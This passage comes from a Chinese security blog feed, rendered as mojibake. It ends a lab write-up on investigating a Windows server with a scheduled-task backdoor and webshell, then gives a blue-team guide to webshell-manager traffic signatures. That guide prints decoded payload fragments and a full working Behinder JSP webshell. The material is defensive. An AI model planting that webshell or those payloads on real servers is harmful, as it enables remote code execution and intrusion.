alt="image-20240313141914152"></p><p>è¿™ä¸¤ä¸ªè®¡åˆ’ä»»åŠ¡éƒ½æ‰§è¡Œè¯¥å¯åŠ¨ç¨‹åºï¼ŒæŸ¥çœ‹è¯¥æ–‡ä»¶å†…å®¹ï¼š</p><p><img src="/img/Emergency-WinServer-web3/image-20240313142100362.png" alt="image-20240313142100362"></p><p>å‘wwwç›®å½•ä¸‹å†™äº†ä¸€ä¸ªwebshell çš„phpåé—¨æœ¨é©¬æ–‡ä»¶ï¼Œå¹¶è¾“å‡ºäº†åˆä¸€ä¸ª<code>flag&#123;888666abc&#125;</code></p><p><img src="/img/Emergency-WinServer-web3/image-20240313142328067.png" alt="image-20240313142328067"></p><p>ç¡®è®¤å†™å…¥äº†åé—¨</p><h3 id="2ã€è‡ªå¯åŠ¨æœåŠ¡æ’æŸ¥"><a href="#2ã€è‡ªå¯åŠ¨æœåŠ¡æ’æŸ¥" class="headerlink" title="2ã€è‡ªå¯åŠ¨æœåŠ¡æ’æŸ¥"></a>2ã€è‡ªå¯åŠ¨æœåŠ¡æ’æŸ¥</h3><p>æœåŠ¡è¿™å—æ­£å¸¸</p><p><img src="/img/Emergency-WinServer-web3/image-20240313142515443.png" alt="image-20240313142515443"></p><h3 id="3ã€è‡ªå¯åŠ¨æ–‡ä»¶å¤¹æ’æŸ¥"><a href="#3ã€è‡ªå¯åŠ¨æ–‡ä»¶å¤¹æ’æŸ¥" class="headerlink" title="3ã€è‡ªå¯åŠ¨æ–‡ä»¶å¤¹æ’æŸ¥"></a>3ã€è‡ªå¯åŠ¨æ–‡ä»¶å¤¹æ’æŸ¥</h3><p>æ­£å¸¸</p><p><img src="/img/Emergency-WinServer-web3/image-20240313142724009.png" alt="image-20240313142724009"></p><h3 id="4ã€è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹æ’æŸ¥"><a href="#4ã€è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹æ’æŸ¥" class="headerlink" title="4ã€è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹æ’æŸ¥"></a>4ã€è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹æ’æŸ¥</h3><p>å®‰å…¨</p><p><img src="/img/Emergency-WinServer-web3/image-20240313160353982.png" alt="image-20240313160353982"></p><h1 id="äº”ã€å…¥ä¾µæ—¥å¿—æ’æŸ¥"><a href="#äº”ã€å…¥ä¾µæ—¥å¿—æ’æŸ¥" class="headerlink" title="äº”ã€å…¥ä¾µæ—¥å¿—æ’æŸ¥"></a>äº”ã€å…¥ä¾µæ—¥å¿—æ’æŸ¥</h1><h3 id="1ã€Windowsç³»ç»Ÿå®‰å…¨æ—¥å¿—æ’æŸ¥"><a href="#1ã€Windowsç³»ç»Ÿå®‰å…¨æ—¥å¿—æ’æŸ¥" class="headerlink" title="1ã€Windowsç³»ç»Ÿå®‰å…¨æ—¥å¿—æ’æŸ¥"></a>1ã€Windowsç³»ç»Ÿå®‰å…¨æ—¥å¿—æ’æŸ¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">4624ï¼šæˆåŠŸç™»å½•çš„è´¦æˆ·ã€‚</span><br><span class="line">4625ï¼šç™»å½•å¤±è´¥çš„å°è¯•ã€‚</span><br><span class="line">4672ï¼šæˆäºˆäº†ç‰¹æ®Šæƒé™ã€‚</span><br><span class="line">4720ï¼šè´¦æˆ·åˆ›å»ºã€‚</span><br><span class="line">4722ï¼šè´¦æˆ·å¯ç”¨ã€‚</span><br><span class="line">4723ï¼šè´¦æˆ·ç¦ç”¨ã€‚</span><br><span class="line">4724ï¼šå¯†ç æ›´æ”¹ã€‚</span><br><span class="line">4725ï¼šå¯†ç é‡ç½®ã€‚</span><br><span class="line">4726ï¼šè´¦æˆ·åˆ é™¤ã€‚</span><br><span class="line">4738ï¼šç”¨æˆ·è´¦æˆ·æ›´æ”¹ã€‚</span><br><span class="line">4739ï¼šç”¨æˆ·ç»„æ›´æ”¹ã€‚</span><br><span class="line">4762ï¼šç”¨æˆ·ç»„æ·»åŠ æˆ–åˆ é™¤æˆå‘˜ã€‚</span><br><span class="line">4776ï¼šæ­¤äº‹ä»¶è¡¨ç¤ºâ€œè®¡ç®—æœºè¯•å›¾éªŒè¯å¸æˆ·çš„å‡­æ®â€ï¼Œè¿™ä¸ªäº‹ä»¶é€šå¸¸ä¸NTLMï¼ˆNT LAN Managerï¼‰èº«ä»½éªŒè¯è¿‡ç¨‹æœ‰å…³ã€‚</span><br></pre></td></tr></table></figure><p>æ—¥å¿—å¤ªå¤šï¼Œè¿™é‡Œæš‚æ—¶å€Ÿç”¨ä¸‹å·¥å…·è¿›è¡Œå¿«é€Ÿåˆ†æ</p><p><img src="/img/Emergency-WinServer-web3/image-20240313161456543.png" alt="image-20240313161456543"></p><p>å†å›åˆ°å®‰å…¨æ—¥å¿—ä¸­æŸ¥çœ‹<code>4776</code>çš„ç™»é™†æƒ…å†µ</p><p><img src="/img/Emergency-WinServer-web3/image-20240313162000328.png" alt="image-20240313162000328"></p><p>åé—¨ç”¨æˆ·<code>hack6618$</code>æ˜¯é€šè¿‡NTLMè®¤è¯è¿›è¡Œç™»é™†</p><h3 id="2ã€Webæ—¥å¿—æ’æŸ¥"><a href="#2ã€Webæ—¥å¿—æ’æŸ¥" class="headerlink" title="2ã€Webæ—¥å¿—æ’æŸ¥"></a>2ã€Webæ—¥å¿—æ’æŸ¥</h3><p><img src="/img/Emergency-WinServer-web3/image-20240313163611200.png" alt="image-20240313163611200"></p><p>æ—¥å¿—ä¸å¤§ï¼Œæˆ‘ä»¬ç”¨åœ¨çº¿æ—¥å¿—å®¡è®¡å·¥å…·è¿›è¡Œç®€å•çš„å®¡è®¡</p><p><img src="/img/Emergency-WinServer-web3/image-20240313163811977.png" alt="image-20240313163811977"></p><p>ä»48æ¡æ—¥å¿—å¼€å§‹ï¼Œå‡ºç°äº†å¤–éƒ¨IP<code>192.168.75.129</code>ï¼Œä¹‹åä»79æ¡æ•°æ®å¼€å§‹ï¼Œé‡å¤äº†å¤šæ¬¡åŒæ ·çš„æ“ä½œï¼Œå‰æ–¹è®¿é—®äº†login.php ç™»é™†é¡µé¢ï¼Œé‚£ä¹ˆé‡å¤çš„æ“ä½œç–‘ä¼¼çˆ†ç ´</p><p><img src="/img/Emergency-WinServer-web3/image-20240313164204194.png" alt="image-20240313164204194"></p><p>çœ‹äº†ä¸€ä¸‹ç™»é™†çš„è¯·æ±‚é¡µé¢ï¼Œç¡®å®æ˜¯<code>/zb_system/cmd.php?act=verify</code>ï¼Œé‚£ä¹ˆç¡®è®¤è¯¥IP åœ¨è¿›è¡Œäº†ç™»é™†çˆ†ç ´è¡Œä¸º</p><p><img src="/img/Emergency-WinServer-web3/image-20240313164128438.png" alt="image-20240313164128438"></p><p>è¯¥çˆ†ç ´è¡Œä¸ºä¸€ç›´æŒç»­åˆ°äº†æœ€åï¼Œä¸”çˆ†ç ´é€Ÿç‡è¾ƒæ…¢</p><p><img src="/img/Emergency-WinServer-web3/image-20240313164726256.png" alt="image-20240313164726256"></p><p>ä½†æ˜¯ä¸­é—´æœ‰å¤šå¤„å­˜åœ¨å…¶ä»–è¡Œä¸ºï¼Œæ€€ç–‘æ”»å‡»è€…ä½¿ç”¨äº†é™åˆ¶çˆ†ç ´é€Ÿç‡çš„çˆ†ç ´å·¥å…·ï¼Œä¸”åœ¨çˆ†ç ´æˆåŠŸä¹‹åå›æ˜¾è´¦å·å¯†ç å¹¶ç»§ç»­çˆ†ç ´</p><p>å¦‚ä¸‹ï¼Œé’ˆå¯¹<code>/zb_system/admin/index.php?act=admin</code>çš„è·¯å¾„ï¼Œæç¤ºæ²¡æœ‰æƒé™ï¼Œé‚£ä¹ˆè¿™é‡Œå¾ˆå¯èƒ½æ˜¯æ”»å‡»è€…åœ¨çˆ†ç ´æˆåŠŸä¹‹åå¯¹è¯¥è´¦æˆ·è¿›è¡Œäº†ç™»é™†ï¼ŒçŒœæµ‹å…¶ç”¨æˆ·åä¸ºadminï¼Œé‚£ä¹ˆé’ˆå¯¹admin ç”¨æˆ·éœ€è¦ä¿®æ”¹æˆå¼ºå¯†ç è¿›è¡ŒåŠ å›º</p><p><img src="/img/Emergency-WinServer-web3/image-20240313165147167.png" alt="image-20240313165147167"></p><p>ä¹‹åç–‘ä¼¼è¿›è¡Œäº†æ’ä»¶çš„ä¸Šä¼ æ“ä½œ</p><p><img src="/img/Emergency-WinServer-web3/image-20240313165652657.png" alt="image-20240313165652657"></p><p>1202æ¡æ—¥å¿—çš„æ—¶å€™ç–‘ä¼¼è¿›è¡Œäº†æ¨¡æ¿æ”»å‡»</p><p><img src="/img/Emergency-WinServer-web3/image-20240313200220003.png" alt="image-20240313200220003"></p><p>åœ¨è¿›è¡Œäº†å¤šæ¬¡ç±»ä¼¼é‡å¤æ€§çš„ä¸Šä¼ æ“ä½œä¹‹åï¼Œè®¿é—®äº†åœ¨è®¡åˆ’ä»»åŠ¡ä¸­æ’æŸ¥åˆ°çš„404 webshellæœ¨é©¬åé—¨æ–‡ä»¶ï¼Œå¯¹æœ¨é©¬æ–‡ä»¶çš„è®¿é—®ä¸€ç›´æŒç»­åˆ°äº†æœ€å</p><p><img src="/img/Emergency-WinServer-web3/image-20240313170116261.png" alt="image-20240313170116261"></p><h1 id="å…­ã€ç—…æ¯’æœ¨é©¬æ–‡ä»¶æ’æŸ¥"><a href="#å…­ã€ç—…æ¯’æœ¨é©¬æ–‡ä»¶æ’æŸ¥" class="headerlink" title="å…­ã€ç—…æ¯’æœ¨é©¬æ–‡ä»¶æ’æŸ¥"></a>å…­ã€ç—…æ¯’æœ¨é©¬æ–‡ä»¶æ’æŸ¥</h1><h3 id="1ã€bat-åé—¨"><a href="#1ã€bat-åé—¨" class="headerlink" title="1ã€bat åé—¨"></a>1ã€bat åé—¨</h3><p>åœ¨è®¡åˆ’ä»»åŠ¡é‡æ’åˆ°çš„<code>system.bat</code>æ–‡ä»¶ï¼Œå½“ä»»æ„ç”¨æˆ·ç™»é™†çš„æ—¶å€™å°†ä¼šæ‰§è¡Œï¼Œåœ¨wwwç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª<code>404.php</code>çš„åé—¨webshellæ–‡ä»¶</p><p><img src="/img/Emergency-WinServer-web3/image-20240313170503828.png" alt="image-20240313170503828"></p><h3 id="2ã€webshell-æœ¨é©¬åé—¨"><a href="#2ã€webshell-æœ¨é©¬åé—¨" class="headerlink" title="2ã€webshell æœ¨é©¬åé—¨"></a>2ã€webshell æœ¨é©¬åé—¨</h3><p>é‚£ä¹ˆå¯¹åº”çš„å°±æ˜¯wwwä¸‹çš„404åé—¨æ–‡ä»¶</p><p><img src="/img/Emergency-WinServer-web3/image-20240313170537636.png" alt="image-20240313170537636"></p><h1 id="ä¸ƒã€æº¯æºè¿½è¸ª"><a href="#ä¸ƒã€æº¯æºè¿½è¸ª" class="headerlink" title="ä¸ƒã€æº¯æºè¿½è¸ª"></a>ä¸ƒã€æº¯æºè¿½è¸ª</h1><p>åœ¨apacheæ—¥å¿—ä¸­ï¼Œå¯¹404.phpæ–‡ä»¶çš„è®¿é—®æ˜¯åœ¨11:34:03ï¼ŒæŒç»­åˆ°11:42:58</p><p><img src="/img/Emergency-WinServer-web3/image-20240313171009891.png" alt="image-20240313171009891"></p><p><code>hack6618$</code>çš„é¦–æ¬¡ç™»é™†æ˜¯åœ¨11:42:26ï¼Œæœ€åä¸€æ¬¡ç™»é™†åœ¨2024&#x2F;3&#x2F;13æ—¥çš„17:04:41</p><p><img src="/img/Emergency-WinServer-web3/image-20240313171208549.png" alt="image-20240313171208549"></p><p>ç­›é€‰4720ï¼Œåé—¨ç”¨æˆ·çš„åˆ›å»ºæ—¶é—´åœ¨11:36:55</p><p><img src="/img/Emergency-WinServer-web3/image-20240313171330670.png" alt="image-20240313171330670"></p><p>æ ¹æ®ç™»é™†çš„æ—¶é—´æ®µåœ¨<code>4624</code>ç™»é™†æˆåŠŸçš„æ—¥å¿—ä¸­ï¼Œæ‰¾åˆ°åé—¨ç”¨æˆ·ç™»é™†çš„IPä¸ºï¼š<code>192.168.75.130</code></p><p><img src="/img/Emergency-WinServer-web3/image-20240313172257722.png" alt="image-20240313172257722"></p><p>é‚£ä¹ˆ<code>system.bat</code>æ˜¯ä»€ä¹ˆæ—¶å€™åˆ›å»ºçš„å‘¢ï¼Œåœ¨3&#x2F;12 11:47åˆ†çš„æ—¶å€™åˆ›å»ºï¼Œåœ¨48åˆ†çš„æ—¶å€™è¿›è¡Œäº†ä¿®æ”¹</p><p><img src="/img/Emergency-WinServer-web3/image-20240313174356303.png" alt="image-20240313174356303"></p><p>åé—¨ç”¨æˆ·åœ¨ç™»é™†ä¹‹åè¿˜åšäº†å“ªäº›äº‹æƒ…å‘¢ï¼Œè¿™é‡Œç”¨<code>LastActivityView</code>è¿›è¡Œæ’æŸ¥ä¸‹</p><p><img src="/img/Emergency-WinServer-web3/image-20240313174606862.png" alt="image-20240313174606862"></p><p>ä»–å¥½åƒä¸€ç›´åœ¨è¿›è¡Œç™»é™†æ“ä½œï¼Œåé¢æ˜¯æˆ‘åšçš„ä¸€äº›æ’æŸ¥æ“ä½œ</p><h1 id="å…«ã€æœ€åä¸€ä¸ªflag"><a href="#å…«ã€æœ€åä¸€ä¸ªflag" class="headerlink" title="å…«ã€æœ€åä¸€ä¸ªflag"></a>å…«ã€æœ€åä¸€ä¸ªflag</h1><p>é‚£ä¹ˆé’ˆå¯¹æœ¬é¶åœºçš„é€šå…³è¿˜å°‘ä¸€ä¸ªflagï¼Œä¹Ÿæ˜¯æ‰¾äº†ä¸€ä¼šå„¿ï¼Œåœ¨å°çš®é‚£é‡Œå‘ç°æœ‰ä¸¤ä¸ªæ•°æ®åº“</p><p><img src="/img/Emergency-WinServer-web3/image-20240313175239355.png" alt="image-20240313175239355"></p><p>çŒœæµ‹flag ä¼šä¸ä¼šåœ¨æ•°æ®åº“ä¸­ï¼Œæœ€ç»ˆä¹Ÿæ˜¯æ‰¾åˆ°äº†æœ€åçš„flag</p><p><img src="/img/Emergency-WinServer-web3/image-20240313175314592.png" alt="image-20240313175314592"></p><h1 id="ä¹ã€å·¥å…·ä¸€æŠŠæ¢­"><a href="#ä¹ã€å·¥å…·ä¸€æŠŠæ¢­" class="headerlink" title="ä¹ã€å·¥å…·ä¸€æŠŠæ¢­"></a>ä¹ã€å·¥å…·ä¸€æŠŠæ¢­</h1><p><img src="/img/Emergency-WinServer-web3/image-20240313175734078.png" alt="image-20240313175734078"></p><p><img src="/img/Emergency-WinServer-web3/image-20240313175745959.png" alt="image-20240313175745959"></p><p><img src="/img/Emergency-WinServer-web3/image-20240313194011963.png" alt="image-20240313194011963"></p><p>å‘€ï¼Ÿæ€ä¹ˆå¤šäº†ä¸€ä¸ªåé—¨ï¼ç„¶åæˆ‘è§‚å¯Ÿäº†<code>template</code>ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œç»“æœå‘ç°æ¯ä¸€ä¸ªå¼€å¤´éƒ½åŒ…å«äº†è¿™ä¸ªæ–‡ä»¶ï¼Œsoï¼Œå…¨éƒ¨éƒ½æ˜¯åé—¨äº†</p><p><img src="/img/Emergency-WinServer-web3/image-20240313195015699.png" alt="image-20240313195015699"></p><p><img src="/img/Emergency-WinServer-web3/image-20240313195526198.png" alt="image-20240313195526198"></p><p>apacheæ—¥å¿—åˆ†æ</p><p><img src="/img/Emergency-WinServer-web3/image-20240313195854351.png" alt="image-20240313195854351"></p><p>å•Šï¼Ÿæ—¥å¿—ä¸­å­˜åœ¨<code>192.168.75.130</code>çš„IPå—</p><p><img src="/img/Emergency-WinServer-web3/image-20240313200641827.png" alt="image-20240313200641827"></p><p>å›å»çœ‹äº†çœ‹æ—¥å¿—ï¼Œç¡®å®å­˜åœ¨<code>192.168.75.130</code>çš„IPï¼Œåœ¨æŸ¥çœ‹æ—¥å¿—çš„æ—¶å€™æ²¡èƒ½çœ‹å…¨ï¼Œå¤§å¤šç²¾åŠ›æ”¾åœ¨è·¯å¾„ä¸Šé¢äº†</p><p><img src="/img/Emergency-WinServer-web3/image-20240313200829514.png" alt="image-20240313200829514"></p>]]></content>
      
      
      <categories>
          
          <category> åº”æ€¥é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¥ä¾µæ’æŸ¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€è“é˜Ÿåº”æ€¥ã€‘WebShell æµé‡ç‰¹å¾</title>
      <link href="/2024/03/13/Blue-Team-WebShell-Traffic-characteristics/"/>
      <url>/2024/03/13/Blue-Team-WebShell-Traffic-characteristics/</url>
      
        <content type="html"><![CDATA[<h1 id="WebShell-æµé‡ç‰¹å¾"><a href="#WebShell-æµé‡ç‰¹å¾" class="headerlink" title="WebShell æµé‡ç‰¹å¾"></a>WebShell æµé‡ç‰¹å¾</h1><h1 id="ä¸€ã€èšå‰‘æµé‡ç‰¹å¾"><a href="#ä¸€ã€èšå‰‘æµé‡ç‰¹å¾" class="headerlink" title="ä¸€ã€èšå‰‘æµé‡ç‰¹å¾"></a>ä¸€ã€èšå‰‘æµé‡ç‰¹å¾</h1><p>å½“æˆ‘ä»¬åœ¨èšå‰‘ä¸­æ‰§è¡Œ<code>whomai</code>å‘½ä»¤ï¼Œå‘é€ç»™é¶æœºçš„æµé‡é•¿è¿™æ ·ï¼š<img src="/img/Blue-Team-WebShell-Traffic-characteristics/image-20240312174418790.png" alt="image-20240312174418790"></p><p>æ‰§è¡Œ<code>dir</code>å‘½ä»¤ç›¸å…³æµé‡ï¼š<img src="/img/Blue-Team-WebShell-Traffic-characteristics/image-20240312180816492.png" alt="image-20240312180816492"></p><p>å¯¹å‰éƒ¨åˆ†è¿›è¡Œurl è§£ç å¯è·å¾—å¦‚ä¸‹ï¼š</p><pre style="white-space: pre-wrap; word-wrap: break-word; overflow-wrap: break-word;"><code>1=@ini_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) &#123;$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) &#123;if(!@is_writable($item)</code></pre><p>æ€»ç»“èšå‰‘æµé‡ç‰¹å¾å¦‚ä¸‹ï¼š</p><ol><li>UAå¤´å¯èƒ½ä¼šæœ‰<code>antSword/ç‰ˆæœ¬å·</code>ç­‰å­—æ ·</li><li>ç”±æœ¨é©¬è¿æ¥å¯†ç å¼€å¤´ï¼ˆåŠ å¯†çš„è¯å¤§éƒ½æ˜¯_0x å¼€å¤´ï¼‰</li><li>æ˜æ–‡ä¸­æœ‰@ini_set() å‡½æ•°å¼€å¤´æ¥éšè—é”™è¯¯ä¿¡æ¯ï¼ˆå¼ºç‰¹å¾ï¼‰</li><li>æœ‰@set_time_limit(0) å‡½æ•°è®¾ç½®è„šæœ¬æ‰§è¡Œæ—¶é—´ä¸ºæ— é™é•¿</li><li>æœ‰@ini_get() å‡½æ•°è·å–phpé…ç½®æ–‡ä»¶ä¸­open_basedirçš„å€¼ï¼Œå³è·å–å¯ä»¥è®¿é—®çš„ç›®å½•</li><li>å­˜åœ¨eval è¿™ä¸ªå±é™©å‡½æ•°ï¼ˆå¼ºç‰¹å¾ï¼‰</li><li>payloadåˆ†æ®µå¹¶ é‡‡ç”¨base64 åŠ å¯†ï¼ˆå› æ­¤æœ‰base64ç•Œé¢ç›¸å…³å‡½æ•°ï¼‰</li><li>æœåŠ¡å™¨è¿”å›çš„æ˜¯æ˜æ–‡ä¿¡æ¯</li></ol><p>å¼ºç‰¹å¾ï¼š</p><ol><li><p>@ini_set() å‡½æ•°å¼€å¤´ç»å¯¹æ˜¯ä¸€ä¸ªå¼ºç‰¹å¾ã€‚å…¶åœ¨ä¸åŒç¼–ç ä¸‹çš„ä¸åŒè¡¨ç°å½¢å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base64ç¼–ç ï¼šQGluaV9zZXQ</span><br><span class="line">chrç¼–ç ï¼šcHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116)</span><br><span class="line">rot13ç¼–ç ï¼š@vav_frg</span><br></pre></td></tr></table></figure></li><li><p>ä»¥ä¸Šï¼Œä¸ç®¡å„ç§ç¼–ç ï¼Œæ•°æ®åŒ…ä¸­å­˜åœ¨eval å‡½æ•°</p></li></ol><h1 id="äºŒã€å“¥æ–¯æ‹‰æµé‡ç‰¹å¾"><a href="#äºŒã€å“¥æ–¯æ‹‰æµé‡ç‰¹å¾" class="headerlink" title="äºŒã€å“¥æ–¯æ‹‰æµé‡ç‰¹å¾"></a>äºŒã€å“¥æ–¯æ‹‰æµé‡ç‰¹å¾</h1><p>åœ¨å“¥æ–¯æ‹‰ä¸­æ‰§è¡Œ<code>whoami</code>å‘½ä»¤ï¼Œæµé‡å¦‚ä¸‹ï¼š<img src="/img/Blue-Team-WebShell-Traffic-characteristics/image-20240312182433169.png" alt="image-20240312182433169"><img src="/img/Blue-Team-WebShell-Traffic-characteristics/image-20240312183149262.png" alt="image-20240312183149262"></p><p>æ€»ç»“ç‰¹å¾å¦‚ä¸‹ï¼š</p><ol><li>UAå¤´é»˜è®¤æ˜¯ä½¿ç”¨çš„JDK ä¿¡æ¯ï¼ˆå¦‚ Java&#x2F;1.8.0_121ï¼Œå…·ä½“å–å†³JDKç¯å¢ƒï¼‰</li><li>Cookie å€¼æœ‰<code>PHPSESSID=iocrpclbbt8mpg4i11j5ocohu0;</code>ï¼ˆå¼ºç‰¹å¾ï¼‰</li><li>å¤´éƒ¨Acceptå€¼<code>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</code>ï¼ˆå¼±ç‰¹å¾ï¼‰</li><li>ç”±æœ¨é©¬è¿æ¥å¯†ç å¼€å¤´</li><li>é¦–å½“å…¶å†²çš„æ˜¯ eval å‘½ä»¤æ‰§è¡Œå‡½æ•°</li><li>å­˜åœ¨base64_decodeã€strrevå’Œurldecode ç­‰è§£ç å‡½æ•°</li><li>åœ¨è¯·æ±‚ä½“ä¸­å­˜åœ¨key å­—æ®µ</li><li>ç›¸åº”åŒ…åˆ†å‰åä¸¤ç§åŠ å¯†æ–¹å¼</li></ol><p>å¼ºç‰¹å¾ï¼š</p><ol><li>Cookieå€¼å­˜åœ¨<code>PHPSESSID=js1bi491i4bcqlogsotqg91pd6;</code>è¿™ç§å­—æ®µå€¼</li></ol><h1 id="ä¸‰ã€èœåˆ€æµé‡ç‰¹å¾"><a href="#ä¸‰ã€èœåˆ€æµé‡ç‰¹å¾" class="headerlink" title="ä¸‰ã€èœåˆ€æµé‡ç‰¹å¾"></a>ä¸‰ã€èœåˆ€æµé‡ç‰¹å¾</h1><p>åœ¨èœåˆ€ä¸­æ‰§è¡Œ<code>dir</code>å‘½ä»¤ï¼Œæµé‡å¦‚ä¸‹<img src="/img/Blue-Team-WebShell-Traffic-characteristics/image-20240313102854698.png" alt="image-20240313102854698.png"></p><p>æ€»ç»“ç‰¹å¾å¦‚ä¸‹ï¼š</p><ol><li>å¼ºç‰¹å¾ï¼šç›´æ¥evalï¼Œæ˜æ–‡åbase64åŠ å¯†ï¼Œè¯·æ±‚åŒ…ä¸­ä¼šæœ‰evalã€assertè¿™ç§base64ç‰¹å¾çš„å­—ç¬¦</li><li>å¼ºç‰¹å¾ï¼šå›ºå®šå­˜åœ¨<code>QGluaV9zZXQ</code></li><li>è¯·æ±‚ä½“payload ä¸ºbase64ç¼–ç </li><li>è¯·æ±‚ä½“ä¸­å›ºå®šå­˜åœ¨<code>QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</code></li></ol><h1 id="å››ã€å†°è3-0æµé‡ç‰¹å¾"><a href="#å››ã€å†°è3-0æµé‡ç‰¹å¾" class="headerlink" title="å››ã€å†°è3.0æµé‡ç‰¹å¾"></a>å››ã€å†°è3.0æµé‡ç‰¹å¾</h1><p>å†…ç½®16ä¸ªUAå¤´ï¼Œå–æ¶ˆåŠ¨æ€å¯†é’¥è·å–ï¼Œç›®å‰å¾ˆå¤šwafç­‰è®¾å¤‡éƒ½åšäº†å†°è2.0çš„æµé‡ç‰¹å¾åˆ†æã€‚æ‰€ä»¥3.0å–æ¶ˆäº†åŠ¨æ€å¯†é’¥è·å–ï¼›ç•Œé¢ç”±swtæ”¹ä¸ºjavafxï¼›aeså¯†é’¥å˜ä¸ºmd5(â€œpassâ€)[0:16]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">è¯·æ±‚åŒ…ä¸­content-length ä¸º5740æˆ–5720ï¼ˆå¯èƒ½ä¼šæ ¹æ®Javaç‰ˆæœ¬è€Œæ”¹å˜ï¼‰</span><br><span class="line">æ¯ä¸€ä¸ªè¯·æ±‚å¤´ä¸­å­˜åœ¨</span><br><span class="line">Pragma: no-cacheï¼ŒCache-Co</span><br><span class="line"></span><br><span class="line">ntrol: no-cache</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">å‡ºå¤„ï¼šhttps://blog.csdn.net/qq_53577336/article/details/125048353</span><br></pre></td></tr></table></figure><p>åœ¨shell.jspä¸­<code>e45e329feb5d925b</code>ä¸ºrebeyond</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:root xmlns:jsp=&quot;http://java.sun.com/JSP/Page&quot; version=&quot;1.2&quot;&gt;&lt;jsp:directive.page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;/&gt;&lt;jsp:declaration&gt; class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;&lt;/jsp:declaration&gt;&lt;jsp:scriptlet&gt;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&lt;/jsp:scriptlet&gt;&lt;/jsp:root&gt;</span><br></pre></td></tr></table></figure><h1 id="äº”ã€å†°è4-0æµé‡ç‰¹å¾"><a href="#äº”ã€å†°è4-0æµé‡ç‰¹å¾" class="headerlink" title="äº”ã€å†°è4.0æµé‡ç‰¹å¾"></a>äº”ã€å†°è4.0æµé‡ç‰¹å¾</h1><p>å†°è4.0å»ºç«‹æ—¶å€™javaä¹Ÿä¼šä¸ä¸»æœºå»ºç«‹tcpè¿æ¥ï¼Œç«¯å£åœ¨49700å·¦å³æ¯æ¬¡è¿æ¥å°±é€ä¸€å åŠ ï¼Œå†°è4.0ä»–æ˜¯å†…ç½®äº†10ä¸ªuser-agentï¼Œæ¯æ¬¡è¿æ¥shelléƒ½ä¼šæ¢ä¸€ä¸ªè¿›è¡Œä½¿ç”¨è¿æ¥ï¼Œä»–æœ‰å›ºå®šçš„è¯·æ±‚å¤´å’Œå“åº”å¤´ï¼Œå¹¶ä¸”é»˜è®¤æ—¶å€™å†°èwebshelléƒ½æœ‰ä¸€ä¸²å¯†é’¥ï¼Œè¿™ä¸ªå¯†é’¥æ˜¯è¿æ¥å¯†ç 32ä½md5å€¼çš„å‰16ä½ï¼Œé»˜è®¤è¿æ¥å¯†ç æ˜¯rebeyondã€‚</p><p>åœ¨å†°èä¸­æ‰§è¡Œ<code>whoami</code>å‘½ä»¤ï¼Œæµé‡å¦‚ä¸‹ï¼š<img src="/img/Blue-Team-WebShell-Traffic-characteristics/image-20240313102844082.png" alt="image-20240313102844082"><img src="/img/Blue-Team-WebShell-Traffic-characteristics/image-20240313102854690.png" alt="image-20240313102854690"></p><p>å½“æˆ‘ä»¬å°†å¯†æ–‡çš„è¯·æ±‚åŒ…åœ¨å†°èä¸­è¿›è¡Œè§£å¯†å¤„ç†ï¼Œå¾—åˆ°å¦‚ä¸‹ï¼š</p><pre style="white-space: pre-wrap; word-wrap: break-word; overflow-wrap: break-word;"><code>@error_reporting(0);function getSafeStr($str)&#123;    $s1 = iconv('utf-8','gbk//IGNORE',$str);    $s0 = iconv('gbk','utf-8//IGNORE',$s1);    if($s0 == $str)&#123;        return $s0;    &#125;else&#123;        return iconv('gbk','utf-8//IGNORE',$str);    &#125;&#125;function main($cmd,$path)&#123;    @set_time_limit(0);    @ignore_user_abort(1);    @ini_set('max_execution_time', 0);    $result = array();    $PadtJn = @ini_get('disable_functions');    if (! empty($PadtJn)) &#123;        $PadtJn = 